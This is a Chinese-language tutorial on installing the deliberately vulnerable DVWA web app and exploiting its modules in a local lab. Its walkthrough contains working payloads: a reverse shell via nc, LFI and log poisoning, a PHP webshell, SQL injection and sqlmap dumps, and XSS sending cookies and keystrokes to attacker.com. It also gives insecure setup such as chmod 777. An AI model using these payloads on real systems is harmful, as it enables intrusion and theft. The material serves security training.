# DVWA 靶场搭建与实战指南

> DVWA (Damn Vulnerable Web Application) 是最经典的Web安全学习靶场
> 本笔记涵盖从安装到实战的完整流程，适合Web安全入门和练习

---

## 目录

1. [DVWA简介](#1-dvwa简介)
2. [环境搭建](#2-环境搭建)
3. [初始配置](#3-初始配置)
4. [难度等级说明](#4-难度等级说明)
5. [漏洞模块实战](#5-漏洞模块实战)
6. [常见错误解决](#6-常见错误解决)
7. [学习路线建议](#7-学习路线建议)

---

## 1. DVWA简介

### 1.1 什么是DVWA

DVWA是一个用PHP/MySQL编写的Web应用程序，故意设计了多种安全漏洞，用于：
- Web安全学习
- 渗透测试练习
- 安全工具测试
- 教学演示

### 1.2 包含的漏洞类型

```
✓ SQL注入 (SQL Injection)
✓ XSS跨站脚本 (Cross-Site Scripting)
✓ CSRF跨站请求伪造 (CSRF)
✓ 文件包含 (File Inclusion)
✓ 文件上传 (File Upload)
✓ 命令注入 (Command Injection)
✓ 暴力破解 (Brute Force)
✓ 弱会话ID (Weak Session IDs)
```

---

## 2. 环境搭建

### 2.1 Docker安装（推荐）

```bash
# 1. 安装Docker
sudo apt update
sudo apt install docker.io -y
sudo systemctl start docker

# 2. 拉取镜像
docker pull vulnerables/web-dvwa

# 3. 运行容器
docker run -d -p 80:80 --name dvwa vulnerables/web-dvwa

# 4. 访问
浏览器打开: http://localhost

# 5. 默认凭据
用户名: admin
密码: password
```

### 2.2 XAMPP安装（Windows）

```bash
# 1. 下载XAMPP
https://www.apachefriends.org/

# 2. 下载DVWA
https://github.com/digininja/DVWA/archive/master.zip

# 3. 解压到
C:\xampp\htdocs\dvwa

# 4. 配置数据库
复制 config\config.inc.php.dist 为 config.inc.php
修改数据库密码为空（XAMPP默认）

# 5. 启动服务
打开XAMPP Control Panel
启动Apache和MySQL

# 6. 访问
http://localhost/dvwa
```

### 2.3 Linux手动安装

```bash
# 1. 安装LAMP
sudo apt install apache2 mysql-server php php-mysqli php-gd -y

# 2. 下载DVWA
cd /var/www/html
sudo git clone https://github.com/digininja/DVWA.git dvwa

# 3. 配置数据库
sudo mysql -u root -p
CREATE DATABASE dvwa;
CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'p@ssw0rd';
GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';
EXIT;

# 4. 配置DVWA
cd /var/www/html/dvwa/config
sudo cp config.inc.php.dist config.inc.php
sudo vim config.inc.php
# 修改数据库配置

# 5. 设置权限
sudo chmod 777 /var/www/html/dvwa/hackable/uploads/
sudo chmod 777 /var/www/html/dvwa/config

# 6. 修改PHP配置
sudo vim /etc/php/7.4/apache2/php.ini
# allow_url_include = On
# allow_url_fopen = On

# 7. 重启Apache
sudo systemctl restart apache2
```

---

## 3. 初始配置

### 3.1 首次访问

```bash
# 1. 访问设置页面
http://localhost/dvwa/setup.php

# 2. 检查环境
确保所有项为绿色 ✓

# 3. 创建数据库
点击 "Create / Reset Database"

# 4. 登录
用户名: admin
密码: password
```

### 3.2 安全级别设置

```
位置: DVWA Security

级别:
- Low: 无防护（入门）
- Medium: 基础防护（进阶）
- High: 较强防护（高级）
- Impossible: 安全代码（参考）
```

---

## 4. 难度等级说明

### 4.1 Low级别

```php
// 特点: 无任何防护
// 示例: SQL注入
$id = $_REQUEST['id'];
$query = "SELECT * FROM users WHERE id = '$id'";
```

### 4.2 Medium级别

```php
// 特点: 基础过滤
// 示例: SQL注入
$id = mysqli_real_escape_string($conn, $_POST['id']);
$query = "SELECT * FROM users WHERE id = $id";
```

### 4.3 High级别

```php
// 特点: 较强防护
// 示例: SQL注入
$id = $_SESSION['id'];
$query = "SELECT * FROM users WHERE id = '$id' LIMIT 1";
```

### 4.4 Impossible级别

```php
// 特点: 安全实现
// 示例: SQL注入（预编译）
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id');
$stmt->execute(['id' => $id]);
```

---

## 5. 漏洞模块实战

### 5.1 Brute Force（暴力破解）

**Low级别攻击：**

```python
import requests

url = "http://localhost/dvwa/vulnerabilities/brute/"
cookies = {"security": "low", "PHPSESSID": "your_session"}

passwords = ["password", "123456", "admin"]

for pwd in passwords:
    params = {"username": "admin", "password": pwd, "Login": "Login"}
    r = requests.get(url, params=params, cookies=cookies)
    
    if "Welcome" in r.text:
        print(f"[+] Found: {pwd}")
        break
```

**使用Hydra：**

```bash
hydra -l admin -P passwords.txt localhost http-get-form \
"/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^:incorrect"
```

### 5.2 Command Injection（命令注入）

**Low级别攻击：**

```bash
# 基础测试
127.0.0.1

# 命令连接
127.0.0.1 && whoami
127.0.0.1 | whoami
127.0.0.1 ; ls -la

# 反弹Shell
127.0.0.1 && nc -e /bin/bash 192.168.1.10 4444
```

**Medium级别绕过：**

```bash
# 过滤了 && 和 ;
# 使用 | 或 ||
127.0.0.1 | whoami
127.0.0.1 || whoami
```

### 5.3 File Inclusion（文件包含）

**Low级别攻击：**

```bash
# LFI - 读取系统文件
?page=../../../../../../etc/passwd
?page=../../../../../../windows/system32/drivers/etc/hosts

# PHP伪协议
?page=php://filter/convert.base64-encode/resource=index.php

# 日志投毒
# 1. 在User-Agent注入PHP代码
User-Agent: <?php system($_GET['cmd']); ?>

# 2. 包含日志
?page=../../../../../../var/log/apache2/access.log&cmd=whoami
```

### 5.4 File Upload（文件上传）

**Low级别攻击：**

```php
// 创建Webshell: shell.php
<?php
if(isset($_GET['cmd'])){
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>

// 上传后访问
http://localhost/dvwa/hackable/uploads/shell.php?cmd=whoami
```

**Medium级别绕过：**

```bash
# 修改Content-Type
Content-Type: image/jpeg
```

**High级别绕过：**

```bash
# 创建图片马
copy image.jpg /b + shell.php /b shell.jpg

# 配合文件包含使用
?page=../../hackable/uploads/shell.jpg&cmd=whoami
```

### 5.5 SQL Injection（SQL注入）

**Low级别攻击：**

```sql
# 判断注入点
1' or '1'='1
1' and '1'='2

# 联合注入
1' union select null,null#
1' union select user(),database()#
1' union select table_name,null from information_schema.tables#

# 获取数据
1' union select user,password from users#
```

**SQLMap自动化：**

```bash
# 基础扫描
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1" \
--cookie="security=low; PHPSESSID=xxx"

# 获取数据库
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1" \
--cookie="security=low; PHPSESSID=xxx" --dbs

# 获取数据
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1" \
--cookie="security=low; PHPSESSID=xxx" -D dvwa -T users --dump
```

### 5.6 XSS（跨站脚本）

**Reflected XSS（反射型）：**

```html
<!-- Low级别 -->
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>

<!-- Medium级别绕过 -->
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror="alert(1)">
```

**Stored XSS（存储型）：**

```html
<!-- 窃取Cookie -->
<script>
new Image().src="http://attacker.com/steal.php?c="+document.cookie;
</script>

<!-- 键盘记录 -->
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/log.php?key=' + e.key);
}
</script>
```



---

## 6. 常见错误解决

### 6.1 数据库连接失败

**错误信息：**
```
Database Error #2002: No such file or directory
```

**解决方案：**
```bash
# 检查MySQL是否运行
sudo systemctl status mysql

# 启动MySQL
sudo systemctl start mysql

# 检查配置文件
vim config/config.inc.php
# 确认数据库密码正确
```

### 6.2 权限问题

**错误信息：**
```
Can't write to the config folder
```

**解决方案：**
```bash
# 设置正确权限
sudo chmod 777 /var/www/html/dvwa/config
sudo chmod 777 /var/www/html/dvwa/hackable/uploads/

# 或修改所有者
sudo chown -R www-data:www-data /var/www/html/dvwa
```

### 6.3 PHP配置问题

**错误信息：**
```
allow_url_include: Disabled
```

**解决方案：**
```bash
# 找到php.ini
php --ini

# 编辑配置
sudo vim /etc/php/7.4/apache2/php.ini

# 修改以下配置
allow_url_include = On
allow_url_fopen = On
display_errors = Off

# 重启Apache
sudo systemctl restart apache2
```

### 6.4 文件上传失败

**错误信息：**
```
Your image was not uploaded
```

**解决方案：**
```bash
# 检查上传目录权限
ls -la /var/www/html/dvwa/hackable/uploads/

# 设置权限
sudo chmod 777 /var/www/html/dvwa/hackable/uploads/

# 检查PHP上传限制
sudo vim /etc/php/7.4/apache2/php.ini
# upload_max_filesize = 2M
# post_max_size = 8M
```

### 6.5 Session问题

**错误信息：**
```
You don't have permission to access this resource
```

**解决方案：**
```bash
# 清除浏览器Cookie
# 或使用隐私模式

# 检查session目录权限
sudo chmod 777 /var/lib/php/sessions/

# 重新登录
```

### 6.6 Docker容器问题

**容器无法启动：**
```bash
# 查看日志
docker logs dvwa

# 重新创建容器
docker rm -f dvwa
docker run -d -p 80:80 --name dvwa vulnerables/web-dvwa

# 进入容器调试
docker exec -it dvwa /bin/bash
```

---

## 7. 学习路线建议

### 7.1 初级阶段（Low级别）

**第1周：基础漏洞**
```
Day 1-2: Brute Force（暴力破解）
- 理解认证机制
- 学习Burp Suite使用
- 练习字典攻击

Day 3-4: Command Injection（命令注入）
- 理解系统命令执行
- 学习命令连接符
- 练习反弹Shell

Day 5-7: SQL Injection（SQL注入）
- 理解SQL语法
- 学习注入类型
- 练习手工注入和SQLMap
```

**第2周：文件漏洞**
```
Day 1-3: File Inclusion（文件包含）
- 理解文件包含原理
- 学习路径遍历
- 练习日志投毒

Day 4-7: File Upload（文件上传）
- 理解文件上传机制
- 学习绕过技巧
- 练习Webshell使用
```

**第3周：前端漏洞**
```
Day 1-4: XSS（跨站脚本）
- 理解XSS类型
- 学习Payload构造
- 练习Cookie窃取

Day 5-7: CSRF（跨站请求伪造）
- 理解CSRF原理
- 学习Token机制
- 练习CSRF攻击
```

### 7.2 中级阶段（Medium级别）

**学习重点：**
```
1. 理解防护机制
   - 输入过滤
   - 输出编码
   - 白名单验证

2. 学习绕过技巧
   - 编码绕过
   - 大小写绕过
   - 双写绕过
   - 注释绕过

3. 工具进阶
   - Burp Suite Pro
   - 自定义脚本
   - 自动化工具
```

### 7.3 高级阶段（High级别）

**学习重点：**
```
1. 深入理解原理
   - 源码审计
   - 逻辑漏洞
   - 漏洞链组合

2. 高级绕过
   - WAF绕过
   - 协议走私
   - 二次注入

3. 实战技能
   - 内网渗透
   - 权限提升
   - 痕迹清理
```

### 7.4 学习建议

**每日练习计划：**
```
1. 理论学习（30分钟）
   - 阅读漏洞原理
   - 观看教学视频
   - 查阅技术文档

2. 实战练习（1-2小时）
   - 完成DVWA挑战
   - 尝试不同方法
   - 记录学习笔记

3. 总结复盘（30分钟）
   - 整理攻击流程
   - 分析防护方法
   - 编写技术文章
```

**进阶路线：**
```
DVWA (基础) 
  ↓
WebGoat (进阶)
  ↓
Pikachu (综合)
  ↓
HackTheBox (实战)
  ↓
真实SRC (实战)
```

---

## 实战技巧总结

### 抓包工具配置

**Burp Suite：**
```
1. 启动Burp Suite
2. 浏览器设置代理: 127.0.0.1:8080
3. 导入Burp证书
4. 开始抓包分析
```

**常用功能：**
```
- Proxy: 拦截修改请求
- Repeater: 重放测试
- Intruder: 自动化攻击
- Decoder: 编码解码
- Comparer: 对比响应
```

### 获取Session ID

**方法1：浏览器开发者工具**
```
F12 -> Application -> Cookies -> PHPSESSID
```

**方法2：Burp Suite**
```
Proxy -> HTTP history -> 查看Cookie
```

**方法3：命令行**
```bash
curl -i http://localhost/dvwa/login.php
# 查看Set-Cookie头
```

### 自动化脚本模板

```python
#!/usr/bin/env python3
import requests

# 配置
TARGET = "http://localhost/dvwa"
SESSION = "your_phpsessid"
SECURITY = "low"

# Cookie
cookies = {
    "security": SECURITY,
    "PHPSESSID": SESSION
}

# 发送请求
def exploit(payload):
    url = f"{TARGET}/vulnerabilities/sqli/"
    params = {"id": payload, "Submit": "Submit"}
    r = requests.get(url, params=params, cookies=cookies)
    return r.text

# 测试
if __name__ == "__main__":
    result = exploit("1' or '1'='1")
    print(result)
```

---

## 参考资源

**官方资源：**
- GitHub: https://github.com/digininja/DVWA
- 官方文档: https://github.com/digininja/DVWA/blob/master/README.md

**学习资源：**
- OWASP Top 10: https://owasp.org/www-project-top-ten/
- PortSwigger Web Security: https://portswigger.net/web-security
- HackTricks: https://book.hacktricks.xyz/

**视频教程：**
- YouTube: "DVWA Tutorial"
- B站: "DVWA靶场实战"

---

> 💡 **提示**: DVWA是学习工具，请在授权环境中使用。理解漏洞原理比记住攻击方法更重要。
